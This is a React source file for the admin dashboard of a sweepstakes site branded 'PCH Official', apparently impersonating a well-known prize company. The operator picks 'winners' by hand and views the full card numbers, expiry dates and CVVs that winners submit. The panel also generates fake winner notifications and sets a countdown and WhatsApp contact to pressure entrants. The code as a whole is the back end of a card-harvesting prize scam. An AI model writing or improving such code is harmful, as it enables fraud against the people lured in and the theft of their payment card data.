'use client'
import { useState, useEffect, useCallback } from 'react'
import { apiFetch } from '@/lib/apiFetch'

const TABS = ['Users', 'Winner', 'Payments', 'Notifications', 'Settings']

function TabSkeleton({ rows = 4 }) {
  return (
    <div className="bg-white rounded-2xl shadow-sm border p-6 animate-pulse space-y-3" style={{ borderColor: '#e2e8f0' }}>
      <div className="h-5 w-40 rounded bg-gray-200" />
      {Array.from({ length: rows }).map((_, i) => (
        <div key={i} className="h-4 rounded bg-gray-100" style={{ width: `${75 + (i % 3) * 10}%` }} />
      ))}
    </div>
  )
}

export default function AdminPage() {
  const [authed, setAuthed] = useState(false)
  const [pw, setPw] = useState('')
  const [authErr, setAuthErr] = useState('')
  const [authBusy, setAuthBusy] = useState(false)

  async function doLogin(e) {
    e.preventDefault()
    setAuthBusy(true)
    setAuthErr('')
    try {
      const d = await apiFetch('admin-auth', { password: pw })
      if (d.success) setAuthed(true)
      else setAuthErr(d.error || 'Incorrect password')
    } catch {
      setAuthErr('Network error')
    } finally {
      setAuthBusy(false)
    }
  }

  if (!authed) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4" style={{ backgroundColor: '#f8fafc' }}>
        <div className="w-full max-w-sm bg-white rounded-2xl shadow-xl p-8 border-t-4" style={{ borderTopColor: '#FFD700' }}>
          <h1 className="text-2xl font-black mb-2" style={{ color: '#0f172a' }}>Admin Access</h1>
          <p className="text-sm text-gray-500 mb-6">PCH Official Admin Panel</p>
          {authErr && <div className="bg-red-50 border border-red-200 text-red-700 rounded-lg p-3 mb-4 text-sm">{authErr}</div>}
          <form onSubmit={doLogin}>
            <input
              type="password"
              value={pw}
              onChange={(e) => setPw(e.target.value)}
              placeholder="Admin password"
              className="w-full px-4 py-3 rounded-lg border-2 focus:outline-none mb-4"
              style={{ borderColor: '#FFD700' }}
              required
            />
            <button
              type="submit"
              disabled={authBusy}
              className="w-full py-3 rounded-xl font-black"
              style={{ backgroundColor: '#FFD700', color: '#0f172a' }}
            >
              {authBusy ? 'Verifying…' : 'Enter Admin Panel'}
            </button>
          </form>
        </div>
      </div>
    )
  }

  return <AdminDashboard />
}

function AdminDashboard() {
  const [tab, setTab] = useState(0)

  async function logout() {
    await apiFetch('logout')
    window.location.reload()
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#f8fafc' }}>
      <div className="bg-white border-b-2 shadow-sm" style={{ borderColor: '#FFD700' }}>
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-xl font-black" style={{ color: '#FFD700' }}>PCH</span>
            <span className="text-xl font-black" style={{ color: '#0f172a' }}>Admin</span>
          </div>
          <button onClick={logout} className="text-sm font-semibold text-red-600 hover:underline">Logout</button>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 mt-6">
        <div className="flex gap-1 bg-white rounded-xl p-1 shadow-sm border" style={{ borderColor: '#e2e8f0' }}>
          {TABS.map((t, i) => (
            <button
              key={t}
              onClick={() => setTab(i)}
              className="flex-1 py-2 px-3 rounded-lg text-sm font-bold transition-all"
              style={tab === i ? { backgroundColor: '#FFD700', color: '#0f172a' } : { color: '#64748b' }}
            >
              {t}
            </button>
          ))}
        </div>
        <div className="mt-6">
          {tab === 0 && <UsersTab />}
          {tab === 1 && <WinnerTab />}
          {tab === 2 && <PaymentsTab />}
          {tab === 3 && <NotificationsTab />}
          {tab === 4 && <SettingsTab />}
        </div>
      </div>
    </div>
  )
}

/* ── Users Tab ─────────────────────────────────────── */
function UsersTab() {
  const [users, setUsers] = useState([])
  const [loading, setLoading] = useState(true)
  const [busy, setBusy] = useState(null)
  const [confirm, setConfirm] = useState(null)

  const load = useCallback(async () => {
    setLoading(true)
    const d = await apiFetch('admin-get-users')
    setUsers(d.users || [])
    setLoading(false)
  }, [])

  useEffect(() => { load() }, [load])

  async function toggleWinner(user) {
    setBusy(user.id)
    setConfirm(null)
    await apiFetch('admin-toggle-winner', { userId: user.id })
    await load()
    setBusy(null)
  }

  if (loading) return <TabSkeleton rows={5} />
  if (!users.length) return <p className="text-gray-500">No users registered yet.</p>

  return (
    <div className="bg-white rounded-2xl shadow-sm border overflow-hidden" style={{ borderColor: '#e2e8f0' }}>
      <div className="px-6 py-4 border-b font-black text-lg" style={{ color: '#0f172a', borderColor: '#e2e8f0' }}>
        Registered Users ({users.length})
      </div>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead style={{ backgroundColor: '#FFF9C4' }}>
            <tr>
              {['Name', 'Email', 'Signed Up', 'Status', 'Action'].map((h) => (
                <th key={h} className="px-4 py-3 text-left font-bold" style={{ color: '#0f172a' }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {users.map((u) => (
              <tr key={u.id} className="border-t hover:bg-yellow-50 transition-colors" style={{ borderColor: '#f1f5f9' }}>
                <td className="px-4 py-3 font-medium" style={{ color: '#0f172a' }}>
                  {u.full_name}
                  {u.is_winner === 1 && (
                    <span className="ml-2 text-xs font-bold px-2 py-0.5 rounded-full" style={{ backgroundColor: '#FFD700', color: '#0f172a' }}>🏆 Winner</span>
                  )}
                </td>
                <td className="px-4 py-3 text-gray-500">{u.email}</td>
                <td className="px-4 py-3 text-gray-500">{new Date(u.created_at).toLocaleDateString()}</td>
                <td className="px-4 py-3">
                  <span className={`px-2 py-1 rounded-full text-xs font-bold ${u.is_winner ? 'bg-yellow-100 text-yellow-800' : 'bg-gray-100 text-gray-600'}`}>
                    {u.is_winner ? 'Winner' : 'Entered'}
                  </span>
                </td>
                <td className="px-4 py-3">
                  {confirm === u.id ? (
                    <div className="flex gap-2">
                      <button onClick={() => toggleWinner(u)} className="text-xs px-3 py-1 rounded-lg font-bold text-white bg-red-500 hover:bg-red-600">Confirm</button>
                      <button onClick={() => setConfirm(null)} className="text-xs px-3 py-1 rounded-lg font-bold bg-gray-100">Cancel</button>
                    </div>
                  ) : (
                    <button
                      onClick={() => setConfirm(u.id)}
                      disabled={busy === u.id}
                      className="text-xs px-3 py-1 rounded-lg font-bold transition-colors"
                      style={{ backgroundColor: u.is_winner ? '#fee2e2' : '#FFD700', color: u.is_winner ? '#dc2626' : '#0f172a' }}
                    >
                      {busy === u.id ? '…' : u.is_winner ? 'Remove Winner' : 'Mark as Winner'}
                    </button>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

/* ── Winner Tab ─────────────────────────────────────── */
function WinnerTab() {
  const [users, setUsers] = useState([])
  const [loading, setLoading] = useState(true)
  const [busy, setBusy] = useState(false)

  const load = useCallback(async () => {
    setLoading(true)
    const d = await apiFetch('admin-get-users')
    setUsers(d.users || [])
    setLoading(false)
  }, [])

  useEffect(() => { load() }, [load])

  const winner = users.find((u) => u.is_winner === 1)

  async function removeWinner() {
    setBusy(true)
    await apiFetch('admin-toggle-winner', { userId: winner.id })
    await load()
    setBusy(false)
  }

  if (loading) return <TabSkeleton rows={3} />

  if (!winner) {
    return (
      <div className="bg-white rounded-2xl shadow-sm border p-8 text-center" style={{ borderColor: '#e2e8f0' }}>
        <div className="text-4xl mb-3">🏆</div>
        <p className="font-bold text-gray-600">No winner selected yet.</p>
        <p className="text-sm text-gray-400 mt-1">Go to the Users tab to mark a winner.</p>
      </div>
    )
  }

  return (
    <div className="bg-white rounded-2xl shadow-sm border overflow-hidden" style={{ borderColor: '#FFD700' }}>
      <div className="px-6 py-4" style={{ background: 'linear-gradient(135deg,#FFD700,#FFC107)' }}>
        <h2 className="text-xl font-black" style={{ color: '#0f172a' }}>🏆 Current Winner</h2>
      </div>
      <div className="p-6 space-y-4">
        <div className="grid sm:grid-cols-2 gap-4">
          <InfoRow label="Name" value={winner.full_name} />
          <InfoRow label="Email" value={winner.email} />
          <InfoRow label="Winner Since" value={winner.winner_at ? new Date(winner.winner_at).toLocaleString() : 'Unknown'} />
          <InfoRow
            label="Payment Status"
            value={
              <span className={`px-3 py-1 rounded-full text-sm font-bold ${winner.payment_submitted ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>
                {winner.payment_submitted ? '✅ Submitted' : '⏳ Not Submitted'}
              </span>
            }
          />
        </div>
        <button
          onClick={removeWinner}
          disabled={busy}
          className="mt-4 px-6 py-2 rounded-lg font-bold text-sm bg-red-50 text-red-600 hover:bg-red-100 transition-colors"
        >
          {busy ? 'Removing…' : 'Remove Winner'}
        </button>
      </div>
    </div>
  )
}

/* ── Payments Tab ─────────────────────────────────────── */
function PaymentsTab() {
  const [payment, setPayment] = useState(undefined)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    apiFetch('admin-get-payments')
      .then((d) => setPayment(d.payment))
      .finally(() => setLoading(false))
  }, [])

  if (loading) return <TabSkeleton rows={4} />

  if (!payment) {
    return (
      <div className="bg-white rounded-2xl shadow-sm border p-8 text-center" style={{ borderColor: '#e2e8f0' }}>
        <div className="text-4xl mb-3">💳</div>
        <p className="font-bold text-gray-600">Winner hasn&apos;t submitted payment details yet.</p>
      </div>
    )
  }

  return (
    <div className="bg-white rounded-2xl shadow-sm border overflow-hidden" style={{ borderColor: '#e2e8f0' }}>
      <div className="px-6 py-4 font-black text-lg border-b" style={{ color: '#0f172a', borderColor: '#e2e8f0' }}>
        💳 Payment Submission
      </div>
      <div className="p-6 grid sm:grid-cols-2 gap-4">
        <InfoRow label="Winner Name" value={payment.full_name} />
        <InfoRow label="Email" value={payment.email} />
        <InfoRow label="Cardholder Name" value={payment.card_holder_name} />
        <InfoRow label="Card Number" value={payment.card_number} mono />
        <InfoRow label="Expiry Date" value={payment.card_expiry} mono />
        <InfoRow label="CVV" value={payment.card_cvv} mono />
        <InfoRow label="Submitted At" value={payment.payment_submitted_at ? new Date(payment.payment_submitted_at).toLocaleString() : 'Unknown'} />
      </div>
    </div>
  )
}

/* ── Notifications Tab ─────────────────────────────────────── */
function NotificationsTab() {
  const [notifs, setNotifs] = useState([])
  const [loading, setLoading] = useState(true)
  const [genBusy, setGenBusy] = useState(false)
  const [genMsg, setGenMsg] = useState('')

  const load = useCallback(async () => {
    setLoading(true)
    const d = await apiFetch('get-notifications')
    setNotifs(d.notifications || [])
    setLoading(false)
  }, [])

  useEffect(() => { load() }, [load])

  async function generate() {
    setGenBusy(true)
    setGenMsg('')
    const d = await apiFetch('admin-generate-notifications')
    setGenMsg(d.success ? `✅ Generated ${d.inserted} notifications` : '❌ Failed to generate')
    await load()
    setGenBusy(false)
  }

  return (
    <div className="space-y-4">
      <div className="bg-white rounded-2xl shadow-sm border p-6" style={{ borderColor: '#e2e8f0' }}>
        <h3 className="font-black mb-3" style={{ color: '#0f172a' }}>Generate Notifications</h3>
        <button
          onClick={generate}
          disabled={genBusy}
          className="px-6 py-2 rounded-lg font-bold text-sm transition-colors"
          style={{ backgroundColor: genBusy ? '#FFC107' : '#FFD700', color: '#0f172a' }}
        >
          {genBusy ? 'Generating…' : '⚡ Generate 10–15 Notifications'}
        </button>
        {genMsg && <p className="mt-3 text-sm font-medium">{genMsg}</p>}
      </div>

      {loading ? (
        <TabSkeleton rows={4} />
      ) : !notifs.length ? (
        <p className="text-gray-500">No notifications yet. Click Generate above.</p>
      ) : (
        <div className="bg-white rounded-2xl shadow-sm border overflow-hidden" style={{ borderColor: '#e2e8f0' }}>
          <div className="px-6 py-4 font-black border-b" style={{ color: '#0f172a', borderColor: '#e2e8f0' }}>
            Recent Notifications ({notifs.length})
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead style={{ backgroundColor: '#FFF9C4' }}>
                <tr>
                  {['Winner Name', 'Amount', 'Date Won'].map((h) => (
                    <th key={h} className="px-4 py-3 text-left font-bold" style={{ color: '#0f172a' }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {notifs.map((n) => (
                  <tr key={n.id} className="border-t" style={{ borderColor: '#f1f5f9' }}>
                    <td className="px-4 py-3 font-medium">{n.winner_name}</td>
                    <td className="px-4 py-3" style={{ color: '#0f172a' }}>${Number(n.amount).toLocaleString()}</td>
                    <td className="px-4 py-3 text-gray-500">{new Date(n.won_at).toLocaleDateString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  )
}

/* ── Settings Tab ─────────────────────────────────────── */
function isoToLocal(iso) {
  if (!iso) return ''
  try {
    const d = new Date(iso)
    return new Date(d.getTime() - d.getTimezoneOffset() * 60000).toISOString().slice(0, 16)
  } catch { return '' }
}

function localToIso(local) {
  if (!local) return ''
  try { return new Date(local).toISOString() } catch { return '' }
}

function SettingsTab() {
  const [settings, setSettings] = useState({})
  const [loading, setLoading] = useState(true)
  const [savingWa, setSavingWa] = useState(false)
  const [savingDate, setSavingDate] = useState(false)
  const [waMsg, setWaMsg] = useState('')
  const [dateMsg, setDateMsg] = useState('')

  useEffect(() => {
    apiFetch('admin-get-settings')
      .then((d) => setSettings(d.settings || {}))
      .finally(() => setLoading(false))
  }, [])

  async function saveWhatsapp(e) {
    e.preventDefault()
    const number = settings.whatsapp_number || ''
    if (!/^\d+$/.test(number)) { setWaMsg('❌ Digits only please'); return }
    setSavingWa(true)
    setWaMsg('')
    const d = await apiFetch('admin-update-settings', { key: 'whatsapp_number', value: number })
    setWaMsg(d.success ? '✅ Saved!' : '❌ Failed to save')
    setSavingWa(false)
  }

  async function saveEndDate(e) {
    e.preventDefault()
    const iso = localToIso(settings.giveaway_end_date_local || '')
    if (!iso) { setDateMsg('❌ Invalid date'); return }
    setSavingDate(true)
    setDateMsg('')
    const d = await apiFetch('admin-update-settings', { key: 'giveaway_end_date', value: iso })
    setDateMsg(d.success ? '✅ End date updated!' : '❌ Failed to save')
    setSavingDate(false)
  }

  if (loading) return <TabSkeleton rows={3} />

  return (
    <div className="space-y-6 max-w-lg">

      {/* WhatsApp Number */}
      <div className="bg-white rounded-2xl shadow-sm border p-6" style={{ borderColor: '#e2e8f0' }}>
        <h3 className="font-black text-lg mb-1" style={{ color: '#0f172a' }}>WhatsApp Number</h3>
        <p className="text-sm text-gray-500 mb-5">
          Digits only, include country code (e.g. 12025551234).
        </p>
        <form onSubmit={saveWhatsapp} className="space-y-4">
          <input
            type="text"
            value={settings.whatsapp_number || ''}
            onChange={(e) => setSettings((s) => ({ ...s, whatsapp_number: e.target.value.replace(/\D/g, '') }))}
            placeholder="12025551234"
            className="w-full px-4 py-3 rounded-lg border-2 focus:outline-none font-mono"
            style={{ borderColor: '#FFD700' }}
            required
          />
          <button
            type="submit"
            disabled={savingWa}
            className="px-6 py-2 rounded-lg font-bold text-sm"
            style={{ backgroundColor: savingWa ? '#FFC107' : '#FFD700', color: '#0f172a' }}
          >
            {savingWa ? 'Saving…' : 'Save Number'}
          </button>
          {waMsg && <p className="text-sm font-medium">{waMsg}</p>}
        </form>
      </div>

      {/* Giveaway End Date */}
      <div className="bg-white rounded-2xl shadow-sm border p-6" style={{ borderColor: '#e2e8f0' }}>
        <h3 className="font-black text-lg mb-1" style={{ color: '#0f172a' }}>⏰ Giveaway End Date</h3>
        <p className="text-sm text-gray-500 mb-5">
          Sets the countdown timer on the homepage. Uses your local timezone.
        </p>
        <form onSubmit={saveEndDate} className="space-y-4">
          <input
            type="datetime-local"
            value={settings.giveaway_end_date_local || isoToLocal(settings.giveaway_end_date)}
            onChange={(e) => setSettings((s) => ({ ...s, giveaway_end_date_local: e.target.value }))}
            className="w-full px-4 py-3 rounded-lg border-2 focus:outline-none"
            style={{ borderColor: '#FFD700' }}
            required
          />
          <button
            type="submit"
            disabled={savingDate}
            className="px-6 py-2 rounded-lg font-bold text-sm"
            style={{ backgroundColor: savingDate ? '#FFC107' : '#FFD700', color: '#0f172a' }}
          >
            {savingDate ? 'Saving…' : 'Set End Date'}
          </button>
          {dateMsg && <p className="text-sm font-medium">{dateMsg}</p>}
        </form>
      </div>

    </div>
  )
}

/* ── Helper ─────────────────────────────────────── */
function InfoRow({ label, value, mono }) {
  return (
    <div>
      <dt className="text-xs font-bold uppercase tracking-wider text-gray-400">{label}</dt>
      <dd className={`mt-1 font-semibold ${mono ? 'font-mono' : ''}`} style={{ color: '#0f172a' }}>{value}</dd>
    </div>
  )
}
